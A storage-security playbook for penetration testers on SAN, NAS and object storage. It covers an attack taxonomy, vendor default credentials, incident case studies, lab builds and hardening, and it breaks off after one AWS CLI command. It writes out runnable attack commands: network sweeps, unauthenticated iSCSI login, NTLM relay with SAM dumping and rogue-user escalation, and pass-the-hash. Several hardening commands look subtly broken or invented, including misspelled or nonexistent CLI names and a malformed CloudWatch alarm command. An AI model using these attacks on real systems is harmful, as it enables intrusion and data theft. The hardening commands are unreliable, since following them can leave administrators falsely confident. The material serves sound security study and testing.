# Storage SAN Attack Playbook

> A comprehensive playbook for penetration testers targeting storage area networks (SAN), network-attached storage (NAS), and object storage systems. Covers attack surface taxonomy, vendor-specific reconnaissance, real-world incidents, lab setup, and defensive hardening.

## Contents

1. [Storage Attack Surface Taxonomy](#1-storage-attack-surface-taxonomy)
2. [Vendor-Specific Reconnaissance Matrix](#2-vendor-specific-reconnaissance-matrix)
3. [Real-World Incidents](#3-real-world-incidents)
4. [Lab Setup](#4-lab-setup)
5. [Engagement Workflow](#5-engagement-workflow)
6. [Defensive Hardening](#6-defensive-hardening)
7. [Tool Deep Dives](#7-tool-deep-dives)
8. [Evidence Collection](#8-evidence-collection)

---

## 1. Storage Attack Surface Taxonomy

Storage attacks divide along three protocol families. Each family has distinct attack primitives, defensive boundaries, and incident patterns.

### 1.1 Block (SAN) — Raw LUN Access

**Protocols**: iSCSI (TCP 3260), Fibre Channel (FC, FCoE), iSER (InfiniBand), NVMe-oF (TCP/FC/RDMA), SAS

**What the attacker sees**: Raw block device. After mounting, the attacker bypasses every OS-level control on the host that owns the LUN. The attacker sees:
- Live filesystem contents (mounted read-write on the production host)
- Deleted files still in slack space
- Filesystem metadata (inode tables, $MFT, journal)
- Raw database files (MySQL `.ibd`, PostgreSQL `base/`, Oracle `.dbf`)
- VM disk images (qcow2, vmdk, vhdx)

**Attack primitives**:
- sendtargets enumeration (discover IQNs)
- CHAP bypass (no auth on target)
- LUN masking abuse (target exports a LUN to all initiators)
- WWN spoofing (FC fabric trust)
- zoning bypass (permissive fabric)
- FSPF poisoning (route hijack between fabric switches)
- NVMe-oF DH-HMAC-CHAP bypass

**Defensive boundary**: Authentication (CHAP, DH-HMAC-CHAP) and authorization (initiator ACL, fabric zoning, LUN masking) at the protocol layer. Block-level encryption (NetApp NVE, Pure Purity Encryption) defends at-rest.

### 1.2 File (NAS) — Network Filesystem

**Protocols**: NFSv3, NFSv4, NFSv4.1 (pNFS), SMB1/CIFS, SMB2, SMB3, AFP, NetWare Core Protocol (NCP)

**What the attacker sees**: Network filesystem with per-file authorization. Attacks target the protocol's authorization model:
- NFS UID mapping and root squashing (NFSv3 trust)
- NFSv4 ACL inheritance and deny semantics
- SMB share and NTFS ACLs
- SMB signing (relay protection)
- AFP guest access
- Kerberos constrained delegation when domain-joined

**Attack primitives**:
- NFSv3 `showmount -e` enumeration
- NFSv3 `no_root_squash` exploitation (write SUID, write SSH keys, drop cron)
- UID spoofing via `nfsshell` or forged-UID mounts
- NFSv4 ACL bypass via raw COMPOUND operations
- SMB null session share enumeration
- SMB signing disable / relay (ntlmrelayx)
- SMB pass-the-hash for share access
- Kerberos delegation abuse (S4U2Self/S4U2Proxy) when NAS has cifs delegation
- EternalBlue / MS17-010 against Windows-based NAS

**Defensive boundary**: Per-share and per-file ACLs, Kerberos (NFSv4 sec=krb5p), SMB signing, NTLMv2 with channel binding.

### 1.3 Object — HTTP/REST Object Storage

**Protocols**: S3 API (AWS S3, MinIO, Ceph RGW, Wasabi, Backblaze B2, Alibaba OSS), Azure Blob Storage REST, GCP Cloud Storage JSON API, OpenStack Swift v1/v2/v3

**What the attacker sees**: A flat namespace of objects in buckets/containers, accessed via HTTP API with per-request signing. The attacker enumerates buckets by name, lists objects, and reads/modifies them per ACL and policy.

**Attack primitives**:
- Bucket name brute-force (lazys3, bucket_finder, S3Scanner, slurp)
- Anonymous ListObjects / GetObject (public bucket)
- ACL bypass (permissive ACL grants AllUsers READ/WRITE)
- Bucket policy escalation (wildcard Principal, wildcard Action)
- IAM role assumption (over-privileged role with `s3:*`)
- URL signing replay (presigned URLs without expiry enforcement)
- Credential extraction from public objects (AWS keys, DB passwords, private SSH keys)
- Mass-encrypt ransomware pattern

**Defensive boundary**: Bucket policies + ACLs + IAM roles + Block Public Access + Object Lock + versioning + bucket-level KMS encryption.

### 1.4 Vendor Management Plane

**Protocols**: vendor-specific REST/SOAP/XML APIs + web admin console + SSH appliance shell

Every storage vendor exposes a management plane. These planes are CVE-rich and frequently internet-exposed. Compromise of the management plane yields full control of every LUN, share, and bucket on the appliance.

**Vendors and their APIs**:
- **NetApp ONTAP**: REST (9.6+) and ZAPI (XML over HTTPS, legacy)
- **Dell EMC VNX/Unity**: Naviseccli (CLI) + REST API (Unity)
- **Dell EMC PowerStore/Powervault**: REST API
- **Pure Storage**: Purity REST API + Python SDK
- **HPE Nimble/NimbleOS**: REST API on 5392
- **Hitachi VSP**: Storage Navigator REST via Tiered Storage Manager
- **IBM Spectrum Scale (GPFS)**: CLI via SSH + REST
- **QNAP QTS**: web admin on 8080 + CGI APIs
- **Synology DSM**: web admin on 5000/5001 + webapi
- **TrueNAS/FreeNAS**: middleware REST API v2.0

**Attack primitives**:
- Default credential spray (admin/admin, nasadmin/nasadmin)
- Auth bypass CVEs (vendor-specific; consult PSIRT feeds)
- Token theft from exposed metadata endpoints
- SNMP RW community abuse
- SMI-S enumeration (cross-vendor standard)

---

## 2. Vendor-Specific Reconnaissance Matrix

| Vendor | Discovery Ports | Banner / Fingerprint | Default Creds | API |
|--------|----------------|----------------------|---------------|-----|
| **NetApp ONTAP** | 3260 (iSCSI), 2049 (NFS), 445 (SMB), 443 (admin), 22 (SSH) | HTTP title `NetApp` ; SNMP `.1.3.6.1.4.1.789` | admin (installer-set, older = empty) | REST `/api/`, ZAPI `/servlets/netapp.servlets.admin.XMLrequest_filer` |
| **Dell EMC VNX/Unity** | 3260, 2049, 445, 2162 (mgmt), 443 | HTTP title `Unity` / `VNX` ; SNMP `.1.3.6.1.4.1.1981` | admin/admin, nasadmin/nasadmin | Naviseccli CLI, Unity REST `/api/` |
| **Dell EMC PowerStore** | 443 | HTTP title `PowerStore Manager` | admin / installer-set | REST `/api/` |
| **Pure Storage** | 443 | HTTP title `Pure Storage FlashArray` ; SNMP `.1.3.6.1.4.1.25461` | admin (older: pure) | REST `/api/1.0/` ; Python SDK |
| **HPE Nimble** | 5392 | HTTPS, NimbleOS title | admin/admin | REST `/v1/` |
| **Hitachi VSP** | 443 | HTTPS, Storage Navigator title | administrator (HDS-set) | REST `/ConfigurationManager/v1/` |
| **IBM Spectrum Scale (GPFS)** | 22 (SSH) | SSH banner `gpfs` | root / customer-set | CLI + REST |
| **IBM Storwize** | 443, 22 | HTTP title `Storwize` | superuser/admin | REST + SSH CLI |
| **QNAP QTS** | 8080 (http), 443 (https), 445 (SMB), 2049 (NFS) | HTTP title `QTS` ; SNMP `.1.3.6.1.4.1.24681` | admin/admin | CGI `/cgi-bin/quick/quick.cgi`, `/cgi-bin/filemanager/` |
| **Synology DSM** | 5000 (http), 5001 (https), 445, 2049 | HTTP title `Synology DiskStation` ; SNMP `.1.3.6.1.4.1.6574` | admin/admin (DSM 6.x), installer-set (DSM 7.x) | webapi `/webapi/` (SYNO.API.*) |
| **TrueNAS / FreeNAS** | 80 (http), 443 (https), 445, 2049 | HTTP title `TrueNAS` | admin/admin (TrueNAS), root/admin (FreeNAS) | middleware `/api/v2.0/` |
| **MinIO** | 9000 (S3), 9001 (console) | HTTP `Server: MinIO` ; `/minio/health/live` | minioadmin/minioadmin | S3 API + admin API |
| **Ceph RGW** | 7480 (default), 80, 443 | HTTP `Server: Ceph` | (no default admin) | S3 + admin `/admin/` |
| **OpenStack Swift** | 8080, 5000 (auth) | HTTP `X-Trans-Id` header | (per-deployment) | Swift v1 / v2 / v3 |
| **AWS S3** | 443 | HTTP `Server: AmazonS3` | (no default) | S3 REST + IAM |
| **Azure Blob** | 443 | HTTP `Server: Windows-Azure-Blob` | (no default) | Azure REST |
| **GCP Cloud Storage** | 443 | HTTP `Server: UploadServer` | (no default) | JSON API + XML API |

### Recon Flow

```
1. nmap -sV on common ports across the storage subnet
2. HTTP title fingerprint for admin web UIs
3. SNMP vendor MIB walk (.1.3.6.1.4.1.*)
4. sendtargets against TCP 3260
5. showmount -e against TCP 2049
6. crackmapexec against TCP 445
7. aws s3 ls (or curl) against S3 endpoints
8. Identify vendor by response headers (Server: AmazonS3 / MinIO / Ceph)
9. Cross-reference discovered versions against vendor PSIRT feeds
```

---

## 3. Real-World Incidents

Study these incidents to inform engagement scoping, findings severity, and defensive recommendations.

### 3.1 QNAP DeadBolt (2022)

**Vector**: Internet-facing QNAP admin consoles (TCP 8080) with default credentials or vulnerable Photo Station.

**Impact**: Mass encryption of SMB shares on QNAP NAS appliances worldwide. Ransom note in `README.txt` (or similar) at every share root. BTC payment demanded via an embedded QR code.

**Pattern**:
1. Attacker scans internet for QNAP admin (Shodan: `qnap port:8080`)
2. Spray default admin/admin credentials
3. OR exploit Photo Station CVE chain (CVE-2022-27593, CVE-2022-27596)
4. Mount SMB shares via harvested creds
5. Encrypt every file in place, drop ransom note
6. Optionally exfiltrate for double extortion

**Lessons for engagements**:
- QNAP admin consoles must never be internet-facing
- Photo Station (and similar add-ons) is a high-frequency CVE surface; pin versions
- Default admin/admin remains common in the wild
- SMB shares should have immutable backups (Snapshot + WORM)

**Reference**: CISA Advisory AA22-059A (always cite the current advisory during engagements)

### 3.2 Synology DSM (2022)

**Vector**: Internet-facing Synology DSM (TCP 5000/5001) with default or weak credentials, exploiting CVE-2022-27523 / CVE-2022-27524 (Synology Drive) and similar.

**Impact**: Mass encryption of SMB shares on Synology NAS. Similar to DeadBolt in pattern but with different ransomware families (eCh0raix variant).

**Pattern**: Same as DeadBolt, varying in initial access vector (Synology Drive vs Photo Station).

**Lessons**:
- DSM 7+ forces password change on first boot, reducing default-credential exposure
- Network-level restriction of DSM admin is the strongest control
- Synology Snapshot Replication + Immutability defeats ransomware persistence

### 3.3 eCh0raix (2019-ongoing)

**Vector**: QNAP and Synology NAS exposed to the internet with weak credentials or vulnerable application versions.

**Impact**: Encrypted SMB shares, ransom demand in BTC.

**Pattern**: Same as DeadBolt, with eCh0raix family targeting both QNAP and Synology.

**Lessons**: eCh0raix demonstrated that NAS-targeting ransomware was viable; DeadBolt refined the model. Both are still active.

### 3.4 Capital One S3 Breach (2019)

**Vector**: Misconfigured S3 bucket listable by an over-privileged IAM role assumed via SSRF.

**Impact**: 100M+ customer records exposed.

**Pattern**:
1. Attacker enumerates Capital One's AWS environment via reconnaissance
2. Discovers a misconfigured WAF that allowed SSRF
3. Uses SSRF to query the EC2 metadata endpoint
4. Extracts IAM role credentials from metadata
5. Uses the role to enumerate S3 buckets
6. Lists and downloads 100M+ records from a bucket the role could read

**Lessons for engagements**:
- Block Public Access is necessary but not sufficient; IAM role scope is the larger surface
- EC2 IMDSv2 mitigates SSRF-to-metadata attacks
- CloudTrail alerts on mass ListObjects / GetObject are essential
- Bucket-level IAM scope should be least-privilege, not account-wide

### 3.5 Tesla AWS S3 Crypto-Mining (2018)

**Vector**: Exposed Kubernetes console on AWS, with IAM role credentials harvested.

**Impact**: Tesla's AWS account used for crypto-mining; S3 buckets exfiltrated (no encryption ransom).

**Pattern**:
1. Attacker scans for exposed Kubernetes consoles
2. Finds Tesla's console without authentication
3. Uses console to invoke AWS CLI with the pod's IAM role credentials
4. Spins up EC2 instances for crypto-mining
5. Exfiltrates data from S3 buckets the role can read

**Lessons**:
- Kubernetes console exposure is as dangerous as S3 misconfiguration
- IAM role scope (cluster-admin vs namespace-admin) determines blast radius
- CloudTrail alerts on anomalous regions / instances are essential

### 3.6 Code Spaces Shutdown (2014)

**Vector**: Compromised AWS control panel credentials.

**Impact**: Code Spaces (a code-hosting SaaS) shut down entirely after attackers deleted S3 buckets, EBS volumes, and EC2 instances.

**Pattern**:
1. Attacker gains initial access to AWS console (likely via phishing)
2. Adds a rogue SSH key for persistence
3. When Code Spaces detects and responds, attacker begins mass-destruction
4. Deletes all S3 buckets, EBS volumes, EC2 instances, and automated backups
5. Code Spaces unable to recover; shuts down

**Lessons**:
- MFA on root account and all IAM users is mandatory
- Separate backup accounts (different AWS account, different MFA) are essential
- CloudTrail log file validation prevents log tampering
- Object Lock / immutable backups mitigate destruction

### 3.7 Common Patterns Across Incidents

- **Initial access**: Internet-facing admin console + default creds OR IAM role compromise via SSRF/metadata
- **Persistence**: Web shell on appliance, rogue IAM user/key, rogue SSH key
- **Lateral movement**: From appliance to SMB shares; from IAM role to S3 buckets; from storage to backed-up VM images
- **Impact**: Encryption in place (NAS ransomware) or destruction (Code Spaces)
- **Detection gap**: Most victims had CloudTrail / appliance audit logs but no alerts configured for mass-Get/Put/Delete

---

## 4. Lab Setup

A storage attack lab requires a mix of Linux servers running storage target software and client tools. The lab below supports every test case in `test-cases.md`.

### 4.1 Lab Architecture

```
+-------------------+       +-------------------+       +-------------------+
|  attacker         |       |  target array     |       |  AD/LDAP server   |
|  Kali Linux       | ----->|  Linux + tgt      |<----->|  Samba AD or      |
|                   |       |  + OpenFiler/     |       |  OpenLDAP         |
|                   |       |  TrueNAS Core    |       |                   |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        v                           v                           v
+-------------------+       +-------------------+       +-------------------+
|  MinIO server     |       |  NDMP tape daemon |       |  SMB client (Win) |
|  S3-compatible    |       |  (via ndmp-utils) |       |  for SMB tests    |
+-------------------+       +-------------------+       +-------------------+
```

### 4.2 Linux Target — `tgt` for iSCSI

`tgt` (Linux SCSI Target) is the simplest way to expose an iSCSI LUN.

```bash
# Install tgt on the target host
sudo apt install -y tgt

# Create a backing store (sparse file)
sudo truncate -s 10G /var/lib/tgt/lun0.img

# Create a filesystem on the backing store
sudo mkfs.ext4 /var/lib/tgt/lun0.img

# Configure tgt
sudo tee /etc/tgt/conf.d/lun0.conf <<EOF
<target iqn.2001-04.com.example:sn.Lun0>
    backing-store /var/lib/tgt/lun0.img
    initiator-address ALL
    # To require CHAP:
    # incominguser REPLACE_WITH_YOUR_USER REPLACE_WITH_YOUR_SECRET
    # outgoinguser REPLACE_WITH_YOUR_USER REPLACE_WITH_YOUR_SECRET
</target>
EOF

# Reload tgt
sudo systemctl restart tgt

# Verify
sudo tgtadm --lld iscsi --op show --mode target
```

### 4.3 Linux Target — NFS Exports

```bash
# Install NFS server
sudo apt install -y nfs-kernel-server

# Create exports
sudo mkdir -p /exports/data /exports/no_squash
sudo chown -R nobody:nogroup /exports/data

# Configure /etc/exports
sudo tee -a /etc/exports <<EOF
/exports/data        *(rw,sync,no_subtree_check,root_squash,sec=sys)
/exports/no_squash   *(rw,sync,no_subtree_check,no_root_squash,sec=sys)
EOF

# Apply
sudo exportfs -ra
sudo systemctl restart nfs-kernel-server
```

### 4.4 Linux Target — SMB Share

```bash
# Install Samba
sudo apt install -y samba

# Configure /etc/samba/smb.conf
sudo tee -a /etc/samba/smb.conf <<EOF

[shared]
   path = /srv/smb/shared
   browseable = yes
   read only = no
   guest ok = yes

[admin]
   path = /srv/smb/admin
   browseable = yes
   read only = no
   valid users = admin
EOF

# Create shares
sudo mkdir -p /srv/smb/shared /srv/smb/admin
sudo chown -R nobody:nogroup /srv/smb/shared

# Add admin user
sudo smbpasswd -a admin
# Enter password: REPLACE_WITH_YOUR_PASSWORD

# Restart Samba
sudo systemctl restart smbd nmbd
```

### 4.5 MinIO Server

```bash
# Install MinIO
wget https://dl.min.io/server/minio/release/linux-arm64/minio
chmod +x minio
sudo mv minio /usr/local/bin/

# Create data directory
sudo mkdir -p /data/minio
sudo chown -R $USER:$USER /data/minio

# Start MinIO
MINIO_ROOT_USER=engadmin MINIO_ROOT_PASSWORD=REPLACE_WITH_YOUR_PASSWORD \
  minio server /data/minio --console-address ":9001"

# Configure buckets via mc (MinIO Client)
mc alias set lab http://127.0.0.1:9000 engadmin REPLACE_WITH_YOUR_PASSWORD
mc mb lab/public-bucket
mc mb lab/private-bucket
mc mb lab/backup

# Create a public-read bucket
mc anonymous set download lab/public-bucket

# Upload test objects
echo 'sensitive data' | mc pipe lab/private-bucket/secret.txt
echo 'public content' | mc pipe lab/public-bucket/index.html
```

### 4.6 OpenFiler / TrueNAS Core

OpenFiler and TrueNAS Core provide web-managed storage appliances for the lab. Both support iSCSI, NFS, SMB, and snapshots.

**OpenFiler**:
```bash
# Deploy via Docker (community image)
docker run -d --name openfiler \
  --privileged \
  -p 446:446 -p 3260:3260 -p 2049:2049 -p 445:445 \
  -v /srv/openfiler:/opt/openfiler \
  openfiler/openfiler
```

**TrueNAS Core**: deploy as a VM (KVM or VirtualBox) with the official ISO from truenas.com.

### 4.7 Attacker Tool Installation

```bash
# Update Kali
sudo apt update && sudo apt -y upgrade

# Core tools
sudo apt install -y open-iscsi nfs-common nfs-kernel-server smbclient \
  cifs-utils sg3-utils sysfsutils snmp snmpwalk snmp-mibs-downloader \
  wireshark tshark tcpdump dcfldd awscli python3-pip

# Impacket
pip3 install impacket

# CrackMapExec
pip3 install crackmapexec

# AWS Vault
brew install aws-vault  # macOS
# or on Linux:
sudo apt install -y pass
wget https://github.com/99designs/aws-vault/releases/latest/download/aws-vault-linux-amd64
sudo mv aws-vault-linux-amd64 /usr/local/bin/aws-vault
sudo chmod +x /usr/local/bin/aws-vault

# lazys3, bucket_finder, S3Scanner, slurp
git clone https://github.com/craig23/lazys3 /opt/lazys3
git clone https://github.com/FishermansEnemy/bucket_finder /opt/bucket_finder
git clone https://github.com/sa7mon/S3Scanner /opt/S3Scanner
git clone https://github.com/bbb31/slurp /opt/slurp

# MinIO Client
wget https://dl.min.io/client/mc/release/linux-arm64/mc
chmod +x mc
sudo mv mc /usr/local/bin/

# rclone
sudo apt install -y rclone

# NetApp Python SDK
pip3 install netapp-ontap

# Dell EMC Naviseccli (download from Dell support; vendor binary)

# Pure Storage Python SDK
pip3 install purestorage

# pywbem (SMI-S)
pip3 install pywbem

# NDMP library (community)
pip3 install ndmp
```

### 4.8 Optional — Active Directory via Samba

```bash
# Provision a Samba AD for Kerberos delegation tests
sudo apt install -y samba smbclient
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.orig
sudo samba-tool domain provision --use-rfc2307 --interactive
#   Realm: LAB.LOCAL
#   Domain: LAB
#   Server Role: dc
#   DNS Backend: SAMBA_INTERNAL
sudo systemctl restart samba-ad-dc

# Create a user for delegation tests
sudo samba-tool user add nasadmin REPLACE_WITH_YOUR_PASSWORD
sudo samba-tool spn add cifs/nas.lab.local LAB\\nasadmin
sudo samba-tool delegation for-service --account=nasadmin --service=cifs/nas.lab.local --delegate
```

---

## 5. Engagement Workflow

### 5.1 Scoping

Storage engagements require precise scoping because storage systems hold regulated data at scale. Confirm:

- **In-scope appliances**: list of every NetApp/Dell/Pure/QNAP/Synology/TrueNAS instance by hostname, IP, and management IP
- **In-scope buckets**: list of every S3 bucket by name and account (or scope to enumerate within an AWS account)
- **In-scope protocols**: iSCSI, NFS, SMB, NDMP — explicit allow-list
- **Read-only vs read-write**: prefer read-only; require separate authorization for any write test
- **Ransomware simulation**: separate signed authorization; explicit time window; reversible impact
- **Backup resilience test**: explicit authorization to test restore from backup
- **Network scope**: storage VLAN only? Admin VLAN? Production VLAN?
- **Data handling**: customer agreement on encryption-at-rest in engagement vault; retention period; destruction evidence

### 5.2 Recon

```bash
# Subnet sweep for storage services
nmap -sV -p 3260,2049,445,161,10000,9000,8080,5000,5001 10.0.0.0/24 -oA recon/storage_sweep

# Per-host deep dive
for h in $(awk '/Up$/{print $2}' recon/storage_sweep.gnmap); do
  echo "=== $h ==="
  showmount -e $h 2>/dev/null
  crackmapexec smb $h -u '' -p '' --shares 2>/dev/null
  snmpwalk -v2c -c public $h .1.3.6.1.2.1.1.1 2>/dev/null | head -1
  curl -sk "https://${h}:443/" -o /dev/null -w '%{http_code}\n' 2>/dev/null
done | tee recon/per_host.txt
```

### 5.3 Exploitation

Per test case in `test-cases.md`. Document each finding with:
- Target (IP / hostname / bucket name)
- Vulnerability class (e.g., "iSCSI unauth login", "S3 anonymous ListObjects")
- Severity (per the rubric in `SKILL.md`)
- Evidence (command + output + screenshot where applicable)
- Remediation (vendor hardening guide section + specific configuration change)

### 5.4 Post-Exploitation

- Harvest credentials from appliances: NetApp cached LDAP, Synology `/etc/synology/s3.conf`, NDMP tape streams
- Pivot via iSCSI LUN contents: read VM disk images for `authorized_keys`, databases for application credentials
- Pivot via S3 objects: scan with TruffleHog / Gitleaks for AWS keys, DB passwords, private SSH keys
- Demonstrate ransomware-style impact only with separate authorization

### 5.5 Reporting

For each finding:

```
### Finding SN-001: iSCSI LUN accessible without authentication

**Severity**: CRITICAL

**Target**: 10.0.0.5 (NetApp FAS2750, ONTAP 9.11.1)

**Description**: The iSCSI target iqn.2001-04.com.example:sn.Lun0 on 10.0.0.5:3260
accepts initiator login without CHAP authentication. Any host on the storage VLAN
can mount the LUN and read raw disk contents, including databases, VM images,
and deleted files in slack space.

**Reproduction**:
    $ iscsiadm -m discovery -t sendtargets -p 10.0.0.5
    10.0.0.5:3260,1 iqn.2001-04.com.example:sn.Lun0
    $ iscsiadm -m node -T iqn.2001-04.com.example:sn.Lun0 -p 10.0.0.5 -l
    Login to [iface: default, target: iqn.2001-04.com.example:sn.Lun0,
    portal: 10.0.0.5,3260] successful.
    $ iscsiadm -m session -P 3
    tcp: [1] 10.0.0.5:3260,1 iqn.2001-04.com.example:sn.Lun0

**Impact**: Full raw-disk compromise of every LUN exported by the array.
Bypasses OS-level filesystem controls on the host that owns the LUN.

**Remediation**:
- Enable CHAP mutual authentication on the target
- Restrict initiator ACL to known IQNs only
- Enable IPsec for in-transit encryption
- Reference: NetApp ONTAP Security Hardening Guide, section "iSCSI Security"

**Evidence**: ./evidence/sn-001-iscsi-unauth-login.txt
```

---

## 6. Defensive Hardening

### 6.1 NetApp ONTAP Hardening

Source: NetApp ONTAP Security Hardening Guide (latest version).

```bash
# Enable multi-admin verification (MAV) for destructive operations
security multi-admin-verfication modify -enabled true

# Require MFA via RADIUS for admin login
security login create -user-or-group-name admin -application http -authmethod radius
security login create -user-or-group-name admin -application ssh -authmethod radius

# Disable SSL/TLS 1.0 and 1.1
security ssl modify -vserver svm1 -min-version tls1.2

# Require strong ciphers
security ssl modify -vserver svm1 -cipher-suites HIGH

# Enable autonomous ransomware protection (ARP)
volume arp-on -vserver svm1 -volume vol1

# Restrict management interface to admin VLAN
network interface modify -vserver svm1 -lif mgmt -firewall-policy mgmt

# Enable audit logging
security audit log modify -vserver svm1 -enable true
```

### 6.2 Dell EMC Unity Hardening

Source: Dell EMC Unity Security Guide.

```bash
# Disable default nasadmin account (after creating replacement admin)
# Via Unisphere GUI: Users > nasadmin > Disable

# Require MFA via RADIUS for admin login
# Via Unisphere GUI: Settings > Management > Authentication > RADIUS

# Enable LDAP signing (when domain-joined)
# Via Unisphere CLI:
ueclicli -u admin -p REPLACE_WITH_YOUR_PASSWORD ldap modify -signing required

# Enable audit logging
ueclicli -u admin -p REPLACE_WITH_YOUR_PASSWORD audit enable
```

### 6.3 Pure Storage Hardening

Source: Pure Storage Security Hardening Guide.

```bash
# Via REST API:
# Enforce MFA via SAML SSO
curl -k -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"saml_enabled":true,"idp_url":"https://idp.example.com/saml"}' \
  https://10.0.0.5/api/1.0/auth/saml

# Rotate API tokens quarterly
curl -k -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_token_rotate":true}' \
  https://10.0.0.5/api/1.0/admin/users/admin

# Enable SafeMode snapshots (ransomware protection)
purevol snap --snap-suffix safemode --vol vol1 --no-dedup
```

### 6.4 QNAP Hardening

Source: QNAP Security Best Practices.

```bash
# Disable admin/admin default
# Via QTS GUI: Control Panel > System > General Settings > Password

# Enable 2FA
# Via QTS GUI: Control Panel > System > General Settings > 2-Step Verification

# Disable internet-facing admin
# Via QTS GUI: myQNAPcloud > Disable remote access

# Patch to latest firmware
# Via QTS GUI: Control Panel > Firmware Update

# Disable SMBv1
# Via QTS GUI: Control Panel > Network & File Services > Win/Mac/NFS > Advanced Options > Maximum SMB protocol = SMB3

# Enable Snapshot + WORM
# Via QTS GUI: Storage & Snapshots > Snapshot Manager
```

### 6.5 Synology Hardening

Source: Synology Security Best Practices.

```bash
# Disable default admin/admin (DSM 7+ forces this)
# Via DSM GUI: Control Panel > User > admin > Password

# Enable 2FA
# Via DSM GUI: Control Panel > User > Advanced > 2-Factor Authentication

# Disable QuickConnect (internet-facing)
# Via DSM GUI: Control Panel > External Access > QuickConnect > Disable

# Patch to latest DSM
# Via DSM GUI: Control Panel > Update & Restore

# Enable Immutability + Snapshot Replication
# Via DSM GUI: Snapshot Replication > Immutability
```

### 6.6 TrueNAS Hardening

Source: iXsystems TrueNAS Hardening.

```bash
# Disable default admin/admin
# Via TrueNAS GUI: Credentials > Local Users > admin > Edit

# Enable 2FA
# Via TrueNAS GUI: System Settings > General > 2FA

# Disable SMBv1
# Via TrueNAS GUI: Shares > Windows SMB > Edit > Advanced > Minimum SMB protocol = SMB2

# Enable ZFS encryption at-rest
# Via TrueNAS GUI: Storage > Pools > Encryption

# Enable Immutable Snapshots
# Via TrueNAS GUI: Data Protection > Periodic Snapshot Tasks > Immutability
```

### 6.7 AWS S3 Hardening

```bash
# Account-level Block Public Access
aws s3control put-public-access-block \
  --account-id REPLACE_WITH_YOUR_ACCOUNT_ID \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# Bucket-level Object Lock
aws s3api create-bucket \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --object-lock-enabled-for-bucket

# Default encryption with KMS
aws s3api put-bucket-encryption \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --server-side-encryption-configuration \
  '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"aws:kms"}}]}'

# Versioning
aws s3api put-bucket-versioning \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --versioning-configuration Status=Enabled

# TLS-only PutObject bucket policy
aws s3api put-bucket-policy \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --policy file://tls-only.json
# tls-only.json:
# {
#   "Statement": [{
#     "Effect": "Deny",
#     "Principal": "*",
#     "Action": "s3:PutObject",
#     "Condition": { "Bool": { "aws:SecureTransport": false } }
#   }]
# }

# CloudTrail alert on mass PutObject
aws logs put-metric-alarm \
  --alarm-name s3-mass-put \
  --metric-name PutObject \
  --namespace AWS/S3 \
  --statistic Sum \
  --period 300 \
  --threshold 1000 \
  --comparison-greater-than-threshold
```

### 6.8 MinIO Hardening

```bash
# Enable server-side encryption (KMS via Vault Transit or AWS KMS)
mc admin config set myminio encryption \
  kms.vault.endpoint=https://vault.example.com:8200 \
  kms.vault.key-name=minio-key \
  kms.vault.auth.type=approle \
  kms.vault.auth.approle-id=REPLACE_WITH_YOUR_ROLE_ID \
  kms.vault.auth.approle-secret=REPLACE_WITH_YOUR_SECRET_ID
mc admin service restart myminio

# Enforce IAM policies (no anonymous)
mc anonymous set none myminio/public-bucket

# Rotate root credentials quarterly
mc admin user enable myminio old-root
mc admin user add myminio new-root REPLACE_WITH_YOUR_PASSWORD
mc admin policy set myminio consoleAdmin user=new-root
```

---

## 7. Tool Deep Dives

### 7.1 open-iscsi — iSCSI Initiator

`open-iscsi` is the canonical Linux iSCSI initiator. The key commands are:

```bash
# Discovery — enumerate IQNs on a target portal
iscsiadm -m discovery -t sendtargets -p 10.0.0.5

# Node — per-target configuration
#   Stored in /etc/iscsi/nodes/<iqn>/<portal>/
iscsiadm -m node -T <iqn> -p 10.0.0.5 --op update \
  -n node.session.auth.authmethod -v CHAP
iscsiadm -m node -T <iqn> -p 10.0.0.5 --op update \
  -n node.session.auth.username -v REPLACE_WITH_YOUR_USER
iscsiadm -m node -T <iqn> -p 10.0.0.5 --op update \
  -n node.session.auth.password -v REPLACE_WITH_YOUR_SECRET

# Login / logout
iscsiadm -m node -T <iqn> -p 10.0.0.5 -l   # login
iscsiadm -m node -T <iqn> -p 10.0.0.5 -u   # logout

# Session
iscsiadm -m session                       # list sessions
iscsiadm -m session -P 3                  # verbose session info
```

### 7.2 ntlmrelayx (Impacket)

`ntlmrelayx` relays captured NTLM authentications to downstream services. The key use cases for storage attacks:

```bash
# Relay to SMB on a storage appliance (dump SAM if Windows)
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t smb://10.0.0.5 -smb2support --dump-sam

# Relay + add a rogue user (requires delegated admin in target)
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t smb://10.0.0.5 -smb2support \
  --escalate-user DOMAIN\\attacker_user

# Relay to LDAP (modify domain-joined appliance's delegation)
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t ldap://dc.domain.com --delegate-access

# Relay to HTTPS (some vendors' admin APIs)
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t https://10.0.0.5/api/auth
```

### 7.3 CrackMapExec

```bash
# SMB enumeration
crackmapexec smb 10.0.0.0/24 -u '' -p '' --shares
crackmapexec smb 10.0.0.0/24 -u '' -p '' --sessions
crackmapexec smb 10.0.0.0/24 -u '' -p '' --users
crackmapexec smb 10.0.0.0/24 -u '' -p '' --groups
crackmapexec smb 10.0.0.0/24 -u '' -p '' --computers

# Identify relay targets
crackmapexec smb 10.0.0.0/24 -u '' -p '' --gen-relay-list /tmp/relayable.txt

# Pass-the-hash
crackmapexec smb 10.0.0.5 -u Administrator -H REPLACE_WITH_YOUR_NT_HASH --shares

# MSSQL on storage (rare, but some appliances have it)
crackmapexec mssql 10.0.0.5 -u sa -p '' -q 'SELECT @@version'
```

### 7.4 AWS CLI

```bash
# Profile setup
aws configure --profile REPLACE_WITH_PROFILE_NAME
#   Access Key: REPLACE_WITH_YOUR_KEY
#   Secret Key: REPLACE_WITH_YOUR_SECRET
#   Region: us-east-1

# Anonymous (no signing)
aws s3 ls s3://REPLACE_WITH_BUCKET_NAME --no-sign-request --region us-east-1
